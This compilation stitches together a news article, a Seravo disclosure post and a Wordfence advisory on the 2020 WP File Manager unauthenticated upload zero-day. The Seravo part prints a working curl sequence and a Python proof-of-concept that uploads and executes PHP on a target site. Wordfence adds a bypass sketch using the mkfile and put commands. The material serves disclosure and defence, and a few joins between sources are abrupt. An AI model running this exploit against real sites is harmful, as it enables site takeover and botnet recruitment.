# Millions of WordPress sites are being probed and attacked with recent plugin bug

An easy-to-exploit vulnerability in a popular WordPress plugin has triggered an internet-wide hacking spree.
  ![catalin-cimpanu.jpg](https://www.zdnet.com/a/img/resize/cfe8bff3bdc8af3f2ab8d2a4252f39ca491137af/2018/08/21/a59867e9-8d75-40af-a87c-690638f8afa4/catalin-cimpanu.jpg?auto=webp&fit=crop&frame=1&height=192&width=192) Written by [Catalin Cimpanu, Contributor](/meet-the-team/catalin-cimpanu/)  Sept. 6, 2020 at 1:46 a.m. PT

               ![wordpress.jpg](https://www.zdnet.com/a/img/resize/bafb76f4f2fe54fe80ee4550ca31bb50d2060f27/2018/09/12/d4d4ce94-282b-47c8-bb39-e39b68d72333/wordpress.jpg?auto=webp&width=1280)

Millions of WordPress sites have been probed and attacked this week, Defiant, the company behind the Wordfence web firewall said on Friday.

### Security

### Cyber security 101: Protect your privacy from hackers, spies, and the government

Simple steps can make the difference between losing your online accounts or maintaining what is now a precious commodity: Your privacy.

Read now](/article/cybersecurity-101-everything-on-how-to-protect-your-privacy-and-stay-safe-online/)

The sudden spike in attacks happened after hackers discovered and started exploiting a zero-day vulnerability in "[*File Manager*](https://wordpress.org/plugins/wp-file-manager/)," a popular WordPress plugin installed on more than 700,000 sites.

**Also: [The best web hosting providers in 2020](https://www.zdnet.com/article/the-best-web-hosting-providers-find-the-right-service-for-your-site/)**

The zero-day was an unauthenticated file upload vulnerability [[1](https://seravo.com/blog/0-day-vulnerability-in-wp-file-manager/), [2](https://blog.nintechnet.com/critical-zero-day-vulnerability-fixed-in-wordpress-file-manager-700000-installations/), [3](https://www.wordfence.com/blog/2020/09/700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/)] that allowed an attacker to upload malicious files on a site running an older version of the File Manager plugin.

It's unclear how hackers discovered the zero-day, but since earlier this week, they began probing for sites where this plugin might be installed.

If a probe was successful, the attackers would exploit the zero-day and upload a web shell disguised inside an image file on the victim's server. The attackers would then access the web shell and take over the victim's site, ensnaring it inside a botnet.

## Millions of sites have been probed, attacked

"Attacks against this vulnerability have risen dramatically over the last few days," said Ram Gall, Threat Analyst at Defiant.

The attacks started slow, but intensified throughout the week, with Defiant recording attacks against one million WordPress sites, just on Friday, Sept. 4.

In total, Gall says Defiant blocked attacks against [more than 1.7 million sites since Sept. 1](https://www.wordfence.com/blog/2020/09/millions-of-sites-targeted-in-file-manager-vulnerability-attacks/), when the attacks were first discovered.

The 1.7 million figure is more than half of the number of WordPress sites using the Wordfence web firewall. Gall believes the true scale of the attacks is even much larger, as WordPress is installed on hundreds of millions of sites, all of which are probably being gradually probed and hacked.

The good news is that the File Manager developer team created and released a patch for the zero-day on the same day it learned about the attacks. Some site owners have installed the patch, but, as usual, others are lagging behind.

It is this slowness in patching that has recently driven the WordPress developer team to add [an auto-update feature for WordPress themes and plugins](https://www.zdnet.com/article/wordpress-to-add-auto-update-feature-for-themes-and-plugins/). Starting with WordPress 5.5, [released last month](https://wordpress.org/news/2020/08/eckstine/), site owners can configure plugins and themes to auto-update themselves every time a new update is out and make sure their sites are always running the latest version of a theme or plugin and staying safe from attacks.

This works great, and while I don’t need it on many sites I manage, if the client is on managed hosting, often it is the only tool that lets you work directly with the files, so it really comes in handy.

As part of our WordPress upkeep service, we monitor for security threats that can potentially affect our customers. Early in the morning (Finnish time) of September 1st we detected unusual activity affecting several of our customers leading to Seravo being the first to report a new zero day security vulnerability in a popular WordPress plugin to the authors so a critical security update was released within hours.

As our security officer on-call started investigating it, it was quickly uncovered that there was a severe [0-day](https://en.wikipedia.org/wiki/Zero-day_%28computing%29) security vulnerability in the [WordPress plugin WP File Manager](https://wordpress.org/plugins/wp-file-manager/) allowing attackers arbitrary file upload and remote code execution on any WordPress site with this plugin installed. An attacker could potentially do whatever they choose to – steal private data, destroy the site or use the website to mount further attacks on other sites or the infrastructure.

As far as we know both the normal WP File Manager and the WP File Manager Pro version were affected. **The plugin has over 700k active installations**, so it ranks quite high on the most popular WordPress plugins list, thus many sites are affected.

## Security Update Released on the Same Day

Luckily the plugin is actively developed and as Seravo reported this vulnerability to the author, a security update version 6.9 was issued within hours. We urgently advice everybody using anything less than the latest WP File Manager version 6.9 to update to the latest version or alternatively uninstall the plugin (deactivating the plugin is not enough to protect against this vulnerability).

**Seravo’s customers don’t need to take any action, as attacks against sites in our upkeep were prevented by Seravo, even before an official update was available.**

Seravo also reported this to the [WordPress security database wpvulndb.com](https://wpvulndb.com/) that issued a [security notice for WP File Manager < 6.9](https://wpvulndb.com/vulnerabilities/10389) so knowledge of the need to update can spread quickly. We will be publishing more details of how the attack exactly worked and some proof-of-concept code at a later time when it is responsible to do so.

As of 2nd September [this is the version distribution of WP File Manager active installations](https://wordpress.org/plugins/wp-file-manager/advanced/):

## Seravo’s Security Research

As our top priority is to protect our customers, we first remediated in our infrastructure by blocking certain traffic patterns related to this vulnerability. There was already botnets exploiting this vulnerability in the wild. As initially this was a 0-day vulnerability, meaning that there was no known fix available we did some investigation and research to uncover what attackers did to breach a site.

Looking at the http traffic logs on a site that was breached we immediately noticed a probable point of access:

```
<REDACTED-VHOST> 185.222.57.183 - - [31/Aug/2020:23:34:12 +0300] "POST //wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php HTTP/1.1" 200 1085 "-" "python-requests/2.24.0" - "" 0.073
```

Then we skimmed through the codebase beginning from WP File Manager file *lib/php/connector.minimal.php*, and noticed that this very same file executed some code when accessed:

```
[...]
is_readable('./vendor/autoload.php') && require './vendor/autoload.php';

[...]
// // elFinder autoload
require './autoload.php';
[...]

// run elFinder
$connector = new elFinderConnector(new elFinder($opts));
$connector->run();
```

This code is from [elFinder project](https://github.com/Studio-42/elFinder), which is a framework to provide file explorer GUI to web applications. This very specific code was meant as a example, but not to be used in production app as is. But, as we see, it was used, with the consequence that it was possible to execute this part of the code without authenticating.

**Update 22nd Sep 2020:** So, next step was to see if there was some input that would be processed without proper sanitization, and then we could replicate the results.

So, let’s see what happens when `$connector->run();` is executed.

```
[...]
    /**
     * Execute elFinder command and output result
     *
     [...]
     */
    public function run()
    {
        $isPost = $this->reqMethod === 'POST';
        $src = $isPost ? array_merge($_GET, $_POST) : $_GET;
        $maxInputVars = (!$src || isset($src['targets'])) ? ini_get('max_input_vars') : null;
        if ((!$src || $maxInputVars) && $rawPostData = file_get_contents('php://input')) {
            // for max_input_vars and supports IE XDomainRequest()
            $parts = explode('&', $rawPostData);
            if (!$src || $maxInputVars < count($parts)) {
                $src = array();
                foreach ($parts as $part) {
                    list($key, $value) = array_pad(explode('=', $part), 2, '');
                    $key = rawurldecode($key);
                    if (preg_match('/^(.+?)\[([^\[\]]*)\]$/', $key, $m)) {
                        $key = $m[1];
                        $idx = $m[2];
                        if (!isset($src[$key])) {
                            $src[$key] = array();
                        }
                        if ($idx) {
                            $src[$key][$idx] = rawurldecode($value);
                        } else {
                            $src[$key][] = rawurldecode($value);
                        }
                    } else {
                        $src[$key] = rawurldecode($value);
                    }
                }
                $_POST = $this->input_filter($src);
                $_REQUEST = $this->input_filter(array_merge_recursive($src, $_REQUEST));
            }
        }
        [...]
```

So, we read some data from `$_POST`/`$_GET`mostly into variable `$src` and then…

```
[...]
        $cmd = isset($src['cmd']) ? $src['cmd'] : '';
[...]
        $args['debug'] = isset($src['debug']) ? !!$src['debug'] : false;

        $args = $this->input_filter($args);
        if ($hasFiles) {
            $args['FILES'] = $_FILES;
        }
[...]
        try {
            $this->output($this->elFinder->exec($cmd, $args));
[...]
```

So, contents of `$src['cmd']` and `$_FILES` (uploaded files) get used as arguments for `$this->elFinder->exec()`. Could we execute any command, or is there some limitations? By looking at the implementation for `exec()` (in the file `lib/php/elFinder.class.php` we see that only certain predefined commands are allowed to be executed. We also need to pass some variables for defining “target volume” to make things work. This is the full list of allowed commands,

```
    /**
     * Commands and required arguments list
     *
     * @var array
     **/
    protected $commands = array(
        'abort' => array('id' => true),
        'archive' => array('targets' => true, 'type' => true, 'mimes' => false, 'name' => false),
        'callback' => array('node' => true, 'json' => false, 'bind' => false, 'done' => false),
        'chmod' => array('targets' => true, 'mode' => true),
        'dim' => array('target' => true, 'substitute' => false),
        'duplicate' => array('targets' => true, 'suffix' => false),
        'editor' => array('name' => true, 'method' => true, 'args' => false),
        'extract' => array('target' => true, 'mimes' => false, 'makedir' => false),
        'file' => array('target' => true, 'download' => false, 'cpath' => false, 'onetime' => false),
        'get' => array('target' => true, 'conv' => false),
        'info' => array('targets' => true, 'compare' => false),
        'ls' => array('target' => true, 'mimes' => false, 'intersect' => false),
        'mkdir' => array('target' => true, 'name' => false, 'dirs' => false),
        'mkfile' => array('target' => true, 'name' => true, 'mimes' => false),
        'netmount' => array('protocol' => true, 'host' => true, 'path' => false, 'port' => false, 'user' => false, 'pass' => false, 'alias' => false, 'options' => false),
        'open' => array('target' => false, 'tree' => false, 'init' => false, 'mimes' => false, 'compare' => false),
        'parents' => array('target' => true, 'until' => false),
        'paste' => array('dst' => true, 'targets' => true, 'cut' => false, 'mimes' => false, 'renames' => false, 'hashes' => false, 'suffix' => false),
        'put' => array('target' => true, 'content' => '', 'mimes' => false, 'encoding' => false),
        'rename' => array('target' => true, 'name' => true, 'mimes' => false, 'targets' => false, 'q' => false),
        'resize' => array('target' => true, 'width' => false, 'height' => false, 'mode' => false, 'x' => false, 'y' => false, 'degree' => false, 'quality' => false, 'bg' => false),
        'rm' => array('targets' => true),
        'search' => array('q' => true, 'mimes' => false, 'target' => false, 'type' => false),
        'size' => array('targets' => true),
        'subdirs' => array('targets' => true),
        'tmb' => array('targets' => true),
        'tree' => array('target' => true),
        'upload' => array('target' => true, 'FILES' => true, 'mimes' => false, 'html' => false, 'upload' => false, 'name' => false, 'upload_path' => false, 'chunk' => false, 'cid' => false, 'node' => false, 'renames' => false, 'hashes' => false, 'suffix' => false, 'mtime' => false, 'overwrite' => false, 'contentSaveId' => false),
        'url' => array('target' => true, 'options' => false),
        'zipdl' => array('targets' => true, 'download' => false)
    );

```

In this very specific case we were actually only interested in `upload` command, as we were pretty certain that it was probably most severe way to use this entrypoint. As added bonus in previous step we noticed that we can also enable debug mode, so then we did couple tests and we were pretty quickly able to replicate the results – unauthenticated file upload and code execution:

```
# Create custom payload
echo '<?php echo "Hello World!"; ?>' > payload3.php

# Upload the payload
curl -F cmd=upload -F target=l1_ -F debug=1 -F 'upload[]=@payload3.php' \
        -X POST https://YOURSITE/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php

# And execute!
curl -iLsS https://YOURSITE/wp-content/plugins/wp-file-manager/lib/files/payload3.php
```

So, with just a couple commands you can execute any code on target site. We also wrote simple Python script as another PoC using exactly same way to exploit the vulnerability:

```
#!/usr/bin/env python3

import argparse
import sys

import requests  # python-requests, eg. apt-get install python3-requests

def exploit(url):
    full_url = f'{url}/wp-content/plugins/wp-file-manager/lib/php/' + \
               'connector.minimal.php'

    # Entry point is lib/php/connector.minimal.php, which then loads
    # elFinderConnector from file `lib/php/elFinderConnector.class.php`,
    # which then processes our input
    #
    data = {
        'cmd': 'upload',
        'target': 'l1_',
        'debug': 1,
    }
    files = {
        'upload[0]': open('payload.php', 'rb'),
    }

    print(f"Just do it... URL: {full_url}")
    res = requests.post(full_url, data=data, files=files, verify=False)
    print(res.status_code)
    if res.status_code == requests.codes.ok:
        print("Success!?")
        d = res.json()
        p = d.get('added', [])[0].get('url')
        print(f'{url}{p}')
    else:
        print("fail")
        return 1
    return 0

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('url', help="Full URL to the WordPress site " +
                                    "with vulnerable plugin")
    args = parser.parse_args()

    if not args.url.startswith('http'):
        raise ValueError(f"Invalid URL: {args.url}")

    return exploit(args.url)

if __name__ == '__main__':
    sys.exit(main())
```
## Wp File Manager Authors Responded and Published a Fixed Version on the Same Day

We reported the vulnerability to plugin author, WordPress plugin repository and also to WP Vulnerability Database. The fix was released on the same day, and [version 6.9 of WP File Manager plugin fixes current issue by removing the endpoint which allowed unauthenticated access to file upload](https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&new=2373068%40wp-file-manager%2Ftrunk&old=2372895%40wp-file-manager%2Ftrunk&sfp_email=&sfph_mail=).

Since the fix was published, we also notified about the bug on Twitter yesterday:

> Earlier today our Security team noticed security vulnerability in WordPress plugin WP File Manager and noticed the plugin author. Fix is now available, and you should upgrade to v6.9 as soon as possible. Our customer? You're already safe. We will post more details soon

## Security Advice for WordPress Site Owners

If you own a website online, WordPress or not, you need to take security seriously. Even if you don’t think your own site has anything important, an attacker could use it to mount attacks on other websites and you could be held partly liable.

The basic security advice has been the same for many years:

* **Make regular updates, and security updates quickly.** Prefer a hosting and upkeep partner that does this on your behalf, such as [Seravo](https://seravo.com/).
* **Make backups, automatically, every day.** Whatever misfortune your site might have, backups often save the day as it allows one to restore a clean and functional version of the site. [Seravo’s upkeep](https://seravo.com/en/features/secure/) always include automatic pull-style backups that don’t even depend on WordPress to function.
* **Use some kind of monitoring service to detect if the site goes down** so it can be quickly brought up again. There are many cheap online services out there that offer monitoring and email alerts as a separate service. Seravo goes a step further: our service includes 24/7 monitoring and also the response. [We take upkeep seriously.](https://seravo.com/en/features/real/)
* **Follow good [password hygiene](https://linuxnatives.net/2014/password-hygiene-every-mans-responsibility)** so that they are not too easy to guess and that passwords leaked from other sites cannot be re-used to gain entry on your WordPress site.
* **Use HTTPS.** It should be standard in 2020, but still not everybody uses. Any security protection is nullified if the login credentials can be eavesdropped over the network. By choosing a good service provider the use of HTTPS will be included without any additional price and on by default. Good WordPress providers usually also offer many other [additional security features](https://seravo.com/en/features/secure/).

We often hear about WordPress site owners that try to solve security by installing yet another plugin. We don’t believe in this, as we often have seen that plugins are the cause of WordPress security issues, not the solution. This we repeat over and over in our [WordPress 101 presentation](https://seravo.com/blog/wordpress-security-101/). We advice WordPress site owners to [review and remove all unnecessary WordPress plugins](https://seravo.com/blog/clean-up-wordpress-secure-and-faster/) to decrease the so called attack surface of their site.

## How to Clean up after a Breach?

Any site could have a security breach at any time, so it is good to have a recovery plan. Check out the following presentation on how to investigate and clean up a security breach!

# 700,000 WordPress Users Affected by Zero-Day Vulnerability in File Manager Plugin

This morning, on September 1, 2020, the Wordfence Threat Intelligence team was alerted to the presence of a vulnerability being actively exploited in [File Manager](https://wordpress.org/plugins/wp-file-manager/), a WordPress plugin with over 700,000 active installations. This vulnerability allowed unauthenticated users to execute commands and upload malicious files on a target site.

A patch was released this morning on September 1, 2020. We are seeing this vulnerability being actively exploited in the wild, therefore, we urge users to update to the latest version, 6.9, immediately since it contains a patch for this vulnerability and will keep you protected.

Wordfence Premium users as well as those still using the Free version are protected against this attack campaign by the Wordfence firewall’s built-in file upload protection, though the Wordfence firewall needs to be optimized in order to protect your site from this vulnerability.

While analyzing the vulnerability, we discovered that it was possible to bypass the built-in file upload protection so we deployed an additional firewall rule for maximum coverage. Wordfence Premium customers received this new firewall rule today, September 1, 2020, at 2:56PM UTC. Free Wordfence users will receive the rule after thirty days on October 1, 2020.

**Description:** Remote Code Execution

**Affected Plugin:** [File Manager](https://wordpress.org/plugins/wp-file-manager/)

**Plugin Slug:** wp-file-manager

**Affected Versions:** 6.0-6.8

**CVSS Score:** 10.00 (Critical)

**CVSS Vector:** [CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

**Patched Versions:** 6.9

File Manager is a plugin designed to help WordPress administrators manage files on their sites. The plugin contains an additional library, elFinder, which is an open-source file manager designed to create a simple file management interface and provides the core functionality behind the file manager. The File Manager plugin used this library in a way that introduced a vulnerability.

The core of the issue began with the File Manager plugin renaming the extension on the elFinder library’s `connector.minimal.php.dist` file to .php so it could be executed directly, even though the connector file was not used by the File Manager itself. Such libraries often include example files that are not intended to be used “as-is” without adding access controls, and this file had no direct access restrictions, meaning the file could be accessed by anyone. This file could be used to initiate an elFinder command and was hooked to the `elFinderConnector.class.php` file.

```
// run elFinder
$connector = new elFinderConnector(new elFinder($opts));
$connector->run();
```

Any parameters sent in a request to `connector.minimal.php` would be processed by the `run()` function in the `elFinderConnector.class.php` file, including the command that was supplied in the `cmd` parameter.

```
   public function run()
    {
        $isPost = $this->reqMethod === 'POST';
        $src = $isPost ? array_merge($_GET, $_POST) : $_GET;
        $maxInputVars = (!$src || isset($src['targets'])) ? ini_get('max_input_vars') : null;
        if ((!$src || $maxInputVars) && $rawPostData = file_get_contents('php://input')) {
            // for max_input_vars and supports IE XDomainRequest()
            $parts = explode('&', $rawPostData);
            if (!$src || $maxInputVars < count($parts)) {
                $src = array();
                foreach ($parts as $part) {
                    list($key, $value) = array_pad(explode('=', $part), 2, '');
                    $key = rawurldecode($key);
                    if (preg_match('/^(.+?)\[([^\[\]]*)\]$/', $key, $m)) {
                        $key = $m[1];
                        $idx = $m[2];
                        if (!isset($src[$key])) {
                            $src[$key] = array();
                        }
                        if ($idx) {
                            $src[$key][$idx] = rawurldecode($value);
                        } else {
                            $src[$key][] = rawurldecode($value);
                        }
                    } else {
                        $src[$key] = rawurldecode($value);
                    }
                }
                $_POST = $this->input_filter($src);
                $_REQUEST = $this->input_filter(array_merge_recursive($src, $_REQUEST));
            }
        }

        if (isset($src['targets']) && $this->elFinder->maxTargets && count($src['targets']) > $this->elFinder->maxTargets) {
            $this->output(array('error' => $this->elFinder->error(elFinder::ERROR_MAX_TARGTES)));
        }

        $cmd = isset($src['cmd']) ? $src['cmd'] : '';
        $args = array();
```

The list of commands available in elFinder are as follows.

```
   /**
     * Commands and required arguments list

     **/

        'zipdl' => array('targets' => true, 'download' => false)
    );
```

The good news is that elFinder has built-in protection against directory traversal, so an attacker would be unable to use any of these commands on any files outside of the `plugins/wp-file-manager/lib/files/` directory.

The attacks we are seeing in the wild are using the `upload` command to upload PHP files containing webshells hidden in an image to the `wp-content/plugins/wp-file-manager/lib/files/` directory.

Fortunately, both Wordfence Premium and free users have been protected against the campaign targeting this vulnerability. However, for optimal protection we created an additional firewall rule.

### Why We Created An Additional Firewall Rule

While our firewall’s built-in protection prevented direct file upload, we determined that it was possible to send a specially crafted request that would create an empty PHP file by using the `mkfile` command in the `cmd` parameter. An attacker could then send a separate request to save malicious code to that file by sending a request with the `cmd` parameter set to `put`. Additionally, other bypasses may be possible, so we created a firewall rule to completely block any and all access to the `connector.minimal.php` file.

The File Manager plugin patched the issue by removing the `lib/php/connector.minimal.php` file from the plugin altogether, and manually removing this file should also prevent attackers from exploiting this vulnerability without impacting normal functionality. This bypass has not been targeted in the wild.

### A Small Note From The Team at Wordfence

When using utility plugins like this file manager plugin, we recommend taking the utmost precaution. Plugins like this one contain several features that if exposed within the admin area of your WordPress installation, could cause serious problems.

A file manager plugin like this would make it possible for an attacker to manipulate or upload any files of their choosing directly from the WordPress dashboard, potentially allowing them to escalate privileges once in the site’s admin area. For example, an attacker could gain access to the admin area of the site using a compromised password, then access this plugin and upload a webshell to do further enumeration of the server and potentially escalate their attack using another exploit.

For this reason, we recommend uninstalling utility plugins, like file management plugins, when they are not in use, so that they do not create an easy intrusion vector for attackers to escalate their privileges.

## Indicators of Compromise

The Wordfence firewall has blocked over 450,000 exploit attempts targeting this vulnerability over the past several days. We are seeing attackers attempting to inject random files, all of which appear to begin with the word “hard” or “x.” From our firewall attack data, it appears that attackers may be probing for the vulnerability with empty files and if successful, may attempt to inject a malicious file.

Here is a list of some of the files we are seeing uploaded:

* hardfork.php
* hardfind.php
* x.php

Please look for these files in the `/wp-content/plugins/wp-file-manager/lib/files` directory of your site.

The top 6 attacking IP addresses that we are seeing are as follows.

* 185.222.57.183
* 185.81.157.132
* 185.81.157.112
* 185.222.57.93
* 185.81.157.177
* 185.81.157.133

Please look for these offending IP Addresses in your site’s log files.

## Response Timeline

## Conclusion

In today’s post, we detailed a zero-day vulnerability being actively exploited in the File Manager plugin that allows unauthenticated attackers to execute arbitrary code on a WordPress site. This vulnerability was patched this morning and we strongly recommend updating to the latest version of the File Manager plugin, currently version 6.9, right now.

Both [Wordfence Premium](https://www.wordfence.com/wordfence-signup/?promo_id=blog20200901&promo_name=get-premium&promo_creative=txt&promo_position=conclusion) users and sites still running the free version of Wordfence have been protected against attacks targeting this vulnerability due to the Wordfence firewall’s built-in File Upload protection. Wordfence Premium users also received an additional firewall rule protecting against any potential bypasses today, September 1, 2020.

  We've noticed yesterday injected random named files in a wp file manager 6.7 installation in the plugins folder like /libs/files/jhsdfjsfd.php

  You gotta get those files cleared out asap. And make sure new ones don't reappear.

  Hi Rob,

  If you have .htpasswd protecting your entire site (including front-end and back-end) you shouldn't have anything to worry about. If the .htpasswd file is only protecting the /wp-admin area, then your site would still be considered vulnerable to this exploit. Regardless, I would recommend updating to the latest version available as soon as possible.

  Thank you for adding additional information! For brevity we only included the top 6 offending IPs, there were several more on the list omitted from this post.

  Just noticed I got this weird activity, thanks to cleantalk. However the reports are from 2 IPs (Taiwan) ;

  I don't remember I ever installed WP File Manager on my website, since I cannot find the plugin installed (I checked on WP dashboard and Cpanel folder).

  Hi Ritz,

  Attackers will probe any and all sites they can access to see if the vulnerability exists. It's very possible you do not have the WP File Manager plugin installed on your site, but attackers are checking if you do. You can check for this plugin in the plugins area of your WordPress site, and if it is not there it is then it is safe to assume you do not have the plugin installed on your site and you have nothing to worry about.
